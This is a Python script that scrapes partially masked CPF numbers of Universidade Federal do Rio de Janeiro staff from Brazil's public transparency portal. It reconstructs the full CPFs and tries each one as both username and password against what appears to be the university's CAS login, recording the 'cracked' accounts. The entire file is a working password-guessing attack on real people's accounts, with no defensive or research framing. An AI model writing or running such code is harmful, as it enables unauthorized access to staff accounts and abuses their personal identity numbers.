#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import re
from BeautifulSoup import BeautifulSoup
from cpf_util import Util
import cas_login_tester
import time

url = 'http://www.portaldatransparencia.gov.br/servidores/OrgaoLotacao-ListaServidores.asp?CodOS=15000&DescOS=MINISTERIO%20DA%20EDUCACAO&CodOrg=26245&DescOrg=UNIVERSIDADE%20FEDERAL%20DO%20RIO%20DE%20JANEIRO'

def get_cpfs_from_portal_transparencia(page):
    url_page = url + '&Pagina=' + str(page)

    r = requests.get(url_page)
    parsed_html = BeautifulSoup(r.content)


    table = parsed_html.body.findAll(attrs={'summary':re.compile('Lista de servidores')})[0]

    table = BeautifulSoup(str(table))

    tds_cpfs = table.findAll('td', attrs={'class':'firstChild'})

    cpfs_mid = []

    for hit in tds_cpfs:
        encrypted_cpf = str(hit.contents[0].strip())
        cpfs_mid.append(encrypted_cpf[4:11].replace('.',''))

    return cpfs_mid

def crawler():
    start = time.time()
    for i in range(1,10):

        cpfs_mid = get_cpfs_from_portal_transparencia(i)

        crackeds = []
        for cpf_mid in cpfs_mid:
            print(cpf_mid),
            cpfs = Util().cpfs_with_mid(cpf_mid)

            for cpf in cpfs:
                end = time.time()
                time_total = end - start

                resultado = cas_login_tester.request(cpf,cpf)
                if(len(resultado) > 0):
                    print(resultado + " in: " + str(time_total) + 's')
                    crackeds.append(resultado)
                    print('OK'),
                else:
                    print('.'),
            print('\n')
        print(crackeds)
crawler()